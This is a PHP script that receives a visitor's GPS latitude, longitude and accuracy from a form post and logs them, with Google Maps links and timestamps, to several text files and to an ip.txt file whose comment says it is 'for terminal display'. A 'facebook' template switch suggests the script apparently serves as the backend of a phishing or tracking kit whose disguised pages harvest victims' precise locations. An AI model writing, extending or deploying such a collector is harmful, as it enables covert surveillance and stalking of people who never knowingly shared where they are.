<?php
$date = date('dMYHis');
$latitude = isset($_POST['latitude']) ? $_POST['latitude'] : 'Unknown';
$longitude = isset($_POST['longitude']) ? $_POST['longitude'] : 'Unknown';
$accuracy = isset($_POST['accuracy']) ? $_POST['accuracy'] : 'Unknown';
$isFromFacebook = isset($_POST['template']) && $_POST['template'] === 'facebook';

if (!empty($_POST['latitude']) && !empty($_POST['longitude'])) {
    $data = "Latitude: " . $latitude . "\r\n" .
            "Longitude: " . $longitude . "\r\n" .
            "Accuracy: " . $accuracy . " meters\r\n" .
            "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
            "Date: " . $date . "\r\n";
    
    // Only create files if not from Facebook template
    if (!$isFromFacebook) {
        // Create a marker file with minimal information
        file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
        
        // Create a unique filename with timestamp
        $file = 'location_' . $date . '.txt';
        
        $fp = fopen($file, 'w');
        if ($fp) {
            fwrite($fp, $data);
            fclose($fp);
            $console_log = fopen("current_location.txt", "w");
            fwrite($console_log, $data);
            fclose($console_log);
            
            // Append to a master location file
            $masterFile = 'saved.locations.txt';
            
            // Create the master file if it doesn't exist
            if (!file_exists($masterFile)) {
                touch($masterFile);
                chmod($masterFile, 0666); 
            }
            
            $fp = fopen($masterFile, 'a');
            if ($fp) {
                fwrite($fp, "\n=== New Location Captured ===\n" . $data . "\n");
                fclose($fp);
            }
            
            // Create saved_locations directory if it doesn't exist
            if (!is_dir('saved_locations')) {
                mkdir('saved_locations', 0755, true);
            }
            
            // Copy the location file to the saved_locations directory
            copy($file, 'saved_locations/' . $file);
        }
    }
    
    // Log to ip.txt for terminal display (always log)
    try {
        $ip_file = 'ip.txt';
        $fp = fopen($ip_file, 'a');
        if ($fp) {
            fwrite($fp, "Latitude: " . $latitude . "\r\n");
            fwrite($fp, "Longitude: " . $longitude . "\r\n");
            fwrite($fp, "Accuracy: " . $accuracy . " meters\r\n");
            fwrite($fp, "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n");
            fclose($fp);
        }
    } catch (Exception $e) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}

exit();
?> 